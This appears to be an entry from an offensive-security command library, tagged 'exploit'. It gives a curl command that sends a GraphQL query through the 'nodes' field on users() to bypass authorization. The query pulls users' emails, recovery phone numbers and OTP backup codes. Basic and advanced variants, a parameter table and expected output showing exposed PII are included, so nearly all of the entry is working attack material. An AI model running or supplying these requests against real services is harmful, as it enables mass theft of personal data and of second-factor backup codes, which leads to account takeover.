---
id: cmd-uuid-002
data: >-
  curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H
  "Cookie: session=your_session" -d '{"query": "query { users() { nodes { email
  account_recovery_phone_number otp_backup_codes } } }"}'
tags:
  - graphql
  - exploit
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.497Z'
verified: false
validated: true
submitted: true
---
# graphql-vulnerable-users-nodes-query

## Command

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { users() { nodes { email account_recovery_phone_number otp_backup_codes } } }"}'
```

## Description

This command exploits the 'nodes' field on users() to bypass authorization and retrieve unscrubbed sensitive user data including emails, recovery phone numbers, and OTP backup codes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: application/json"` | JSON request body | Yes |
| `-H "Cookie: session=your_session"` | Authentication via session | Yes |
| `-d '{...}'` | Query payload | Yes |
| `nodes { email ... }` | Direct access to fields without scrubbing | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { users() { nodes { email } } }"}'
```

### Advanced Usage

```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -H "Cookie: session=your_session" -d '{"query": "query { users(first: 50) { nodes { email otp_backup_codes } } }"}'
```

## Expected Output

JSON like {"data":{"users":{"nodes":[{"email":"user@example.com","account_recovery_phone_number":"+1-xxx-xxx-12","otp_backup_codes":["hashed_code1"]}]}}}, revealing full PII.

## Related

- [[commands/graphql-secure-users-edges-query]]
- [[procedures/Bypass-GraphQL-Authorization-Using-Nodes-Field-on-Users]]
